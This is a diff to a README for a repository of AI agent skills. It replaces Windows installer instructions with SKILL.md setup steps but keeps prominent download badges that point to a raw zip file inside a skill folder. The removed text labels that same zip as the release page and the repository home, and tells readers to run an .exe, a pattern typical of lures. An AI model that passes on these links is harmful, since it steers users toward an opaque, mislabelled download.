@@ -1,6 +1,6 @@
 # 🤖 claude-skills - Curated Skills for Claude AI Use
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
+[![Download Support Skill Bundle](https://img.shields.io/badge/Download-Support_Skill_Bundle-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
 
 ---
 
@@ -19,7 +19,7 @@ You do not need any programming knowledge to use this collection. Everything is 
 - Rules to adjust how Claude processes information  
 - Easy setup with no coding required  
 - Regular updates from the community  
-- Works on any Windows PC  
+- Works anywhere your agent supports the `SKILL.md` format
 
 ---
 
@@ -27,64 +27,59 @@ You do not need any programming knowledge to use this collection. Everything is 
 
 Before you start, make sure your computer meets these minimum requirements:
 
-- Windows 10 or later  
-- At least 4 GB of RAM (8 GB recommended)  
-- 500 MB free disk space  
-- Internet connection to download and update skills  
-- Web browser to access GitHub releases page  
+- An AI agent that supports the `SKILL.md` format
+- Git or a web browser to download the repository
+- Any operating system supported by your agent
 
 ---
 
 ## 🚀 Getting Started
 
-Follow these steps to download and run claude-skills on your Windows computer.
+Follow these steps to add a skill to your agent.
 
-### Step 1: Visit the Release Page
+### Step 1: Download the Repository
 
-Click the big button below to go to the downloads page on GitHub.
+Open the repository, then use **Code > Download ZIP** or clone it with Git:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
+```bash
+git clone https://github.com/Marine-softdrink524/claude-skills.git
+```
 
-This page lists all the available files and versions of claude-skills. You will find the latest version at the top.
+### Step 2: Choose a Skill
 
-### Step 2: Download the Latest Version
+- Open the `skills/` directory.
+- Choose the skill that matches your task.
+- Read its `SKILL.md` for setup and usage instructions.
 
-- Look for the latest release near the top, marked by the most recent date.  
-- Find the file labeled something like `claude-skills.zip` or `claude-skills-installer.exe`.  
-- Click on the file name to start downloading it.  
+### Step 3: Install the Skill
 
-### Step 3: Extract or Run the Installer
+- Copy the complete skill folder into your agent's skills directory.
+- Keep supporting `scripts/`, `references/`, and `assets/` folders with the skill.
+- Follow your agent's documentation if it uses a different installation path.
 
-- If you downloaded a `.zip` file, right-click it and select "Extract All" to unpack the contents.  
-- If you downloaded an `.exe` installer, double-click it and follow the instructions on screen.  
+### Step 4: Use the Skill
 
-Make sure to choose an install location you can remember, such as your Desktop or Documents folder.
-
-### Step 4: Open claude-skills
-
-- After installation or extraction, open the folder where you saved the files.  
-- Look for a file named `claude-skills.exe` or a similar launcher.  
-- Double-click it to start the program.  
-
-The app will open a window with the available skills and prompts.
+- Restart or reload your agent if required.
+- Ask for a task described in the skill's frontmatter.
+- Confirm the agent selected the expected skill before relying on its output.
 
 ---
 
 ## 🛠️ How to Use claude-skills
 
-Once the app is running, you can browse and try different skills. Here is how to begin:
+Once a skill is installed, use it through your agent:
 
 1. **Browse Skills:**  
-   Use the menu or search bar to find skills that match what you want Claude to do.  
+   Review the folders under `skills/` or your agent's installed-skill list.
 
 2. **Select a Prompt or Rule:**  
-   Click on a prompt or rule to load it into Claude. The text will show in the input area, ready to send.  
+   Choose a skill whose description matches your task.
 
 3. **Run the Skill:**  
-   Follow instructions within the app to send the prompt to Claude AI.  
+   Describe your goal and provide the inputs requested by the skill.
 
 4. **View Results:**  
-   Claude will respond based on the skill or prompt you selected.  
+   Review the output and any validation steps required by the skill.
 
 5. **Customize:**  
    You can edit prompts or rules to better fit your specific needs.  
@@ -106,7 +101,7 @@ Once the app is running, you can browse and try different skills. Here is how to
 - Use clear and simple language in prompts.  
 - Try different skills to see which fits your need.  
 - Customize prompts gently to avoid confusing Claude.  
-- Keep the app updated by checking the releases page regularly.  
+- Keep the repository updated and recopy skills when their files change.
 
 ---
 
@@ -114,10 +109,9 @@ Once the app is running, you can browse and try different skills. Here is how to
 
 To update to the newest version:
 
-1. Return to the [Releases page](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip).  
-2. Download the latest release files as before.  
-3. Replace your old files with the new ones, or rerun the installer.  
-4. Restart the application to use the new skills and features.  
+1. Pull the latest repository changes with `git pull`, or download a fresh ZIP.
+2. Replace the installed skill folder with the updated copy.
+3. Restart or reload your agent if required.
 
 ---
 
@@ -133,9 +127,9 @@ If you encounter any issues or want to suggest improvements:
 
 ## 🔗 Useful Links
 
-- Main Release Page: [https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)  
-- Repository Home: [https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)  
+- Current Support Skill Bundle: [skills_claude_v3.9.zip](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
+- Repository Home: [github.com/Marine-softdrink524/claude-skills](https://github.com/Marine-softdrink524/claude-skills)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
+[![Download Support Skill Bundle](https://img.shields.io/badge/Download-Support_Skill_Bundle-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
